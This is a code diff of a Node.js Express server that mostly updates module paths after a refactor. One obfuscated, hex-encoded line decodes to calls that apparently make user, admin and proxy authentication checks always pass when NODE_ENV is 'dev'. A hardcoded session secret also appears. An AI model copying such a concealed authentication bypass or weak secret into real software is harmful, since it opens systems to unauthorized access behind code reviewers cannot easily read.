@@ -13,7 +13,7 @@ require("jsdom/lib/old-api").env("", function(err, window) {
 
     var session = require('express-session');
     var FileStore = require('session-file-store')(session);
-    var xcConsole = require('./expServerXcConsole.js').xcConsole;
+    var xcConsole = require('./utils/expServerXcConsole.js');
 
     var xlrRoot = null;
 
@@ -24,8 +24,8 @@ require("jsdom/lib/old-api").env("", function(err, window) {
         secret: 'keyboard cat'
     };
 
-    var sessionAges = require('./expServerSupport.js').sessionAges;
-    var defaultSessionAge = require('./expServerSupport.js').defaultSessionAge;
+    var sessionAges = require('./utils/expServerSupport.js').sessionAges;
+    var defaultSessionAge = require('./utils/expServerSupport.js').defaultSessionAge;
 
     var sessionOpts = {
         saveUninitialized: false,
@@ -48,7 +48,7 @@ require("jsdom/lib/old-api").env("", function(err, window) {
     var exec = require("child_process").exec;
     var proxy = require('express-http-proxy');
     var url = require('url')
-    var socket = require('./socket.js').socketIoServer;
+    var socket = require('./controllers/socket.js').socketIoServer;
     var serverPort = process.env.XCE_EXP_PORT ?
         parseInt(process.env.XCE_EXP_PORT) : 12124;
     if (process.env.NODE_ENV === "test") {
@@ -60,7 +60,7 @@ require("jsdom/lib/old-api").env("", function(err, window) {
     var jupyterPort = process.env.XCE_JUPYTER_PORT ?
         parseInt(process.env.XCE_JUPYTER_PORT) : 8890;
 
-    var _0x66c0=["\x2E\x2F\x65\x78\x70\x53\x65\x72\x76\x65\x72\x53\x75\x70\x70\x6F\x72\x74\x2E\x6A\x73","\x4E\x4F\x44\x45\x5F\x45\x4E\x56","\x65\x6E\x76","\x64\x65\x76","\x75\x73\x65\x72\x54\x72\x75\x65","\x63\x68\x65\x63\x6B\x41\x75\x74\x68\x54\x72\x75\x65","\x61\x64\x6D\x69\x6E\x54\x72\x75\x65","\x63\x68\x65\x63\x6B\x41\x75\x74\x68\x41\x64\x6D\x69\x6E\x54\x72\x75\x65","\x70\x72\x6F\x78\x79\x55\x73\x65\x72\x54\x72\x75\x65","\x63\x68\x65\x63\x6B\x50\x72\x6F\x78\x79\x41\x75\x74\x68\x54\x72\x75\x65"];var support=require(_0x66c0[0]);if(process[_0x66c0[2]][_0x66c0[1]]=== _0x66c0[3]){support[_0x66c0[5]](support[_0x66c0[4]]);support[_0x66c0[7]](support[_0x66c0[6]]);support[_0x66c0[9]](support[_0x66c0[8]])}
+    var _0x66c0=["\x2E\x2F\x75\x74\x69\x6C\x73\x2F\x65\x78\x70\x53\x65\x72\x76\x65\x72\x53\x75\x70\x70\x6F\x72\x74\x2E\x6A\x73","\x4E\x4F\x44\x45\x5F\x45\x4E\x56","\x65\x6E\x76","\x64\x65\x76","\x75\x73\x65\x72\x54\x72\x75\x65","\x63\x68\x65\x63\x6B\x41\x75\x74\x68\x54\x72\x75\x65","\x61\x64\x6D\x69\x6E\x54\x72\x75\x65","\x63\x68\x65\x63\x6B\x41\x75\x74\x68\x41\x64\x6D\x69\x6E\x54\x72\x75\x65","\x70\x72\x6F\x78\x79\x55\x73\x65\x72\x54\x72\x75\x65","\x63\x68\x65\x63\x6B\x50\x72\x6F\x78\x79\x41\x75\x74\x68\x54\x72\x75\x65"];var support=require(_0x66c0[0]);if(process[_0x66c0[2]][_0x66c0[1]]=== _0x66c0[3]){support[_0x66c0[5]](support[_0x66c0[4]]);support[_0x66c0[7]](support[_0x66c0[6]]);support[_0x66c0[9]](support[_0x66c0[8]])}
 
     var payloadSizeLimit = '25mb';
     var app = express();
@@ -172,18 +172,19 @@ require("jsdom/lib/old-api").env("", function(err, window) {
         }
 
         if (!cfgExists || !xlrRootFound) {
+            console.log(xcConsole);
             xcConsole.error('Config file ' + cfgLocation + 'does not exist or XcalarRootCompletePath not found');
             xcConsole.error('Using default XcalarRootCompletePath ' + xlrRoot);
         }
     }
 
     // Invoke the sqlApi router
-    app.use(require('./route/sqlRestApi.js').router);
+    app.use(require('./route/sql.js').router);
 
     // Invoke the xcrpc router
     app.use(require('./route/xcrpc.js').router);
 
-    require('./utils/dagUtils.js')
+    require('./utils/dag/dagUtils.js')
 
     function getOperatingSystem() {
         var deferred = jQuery.Deferred();
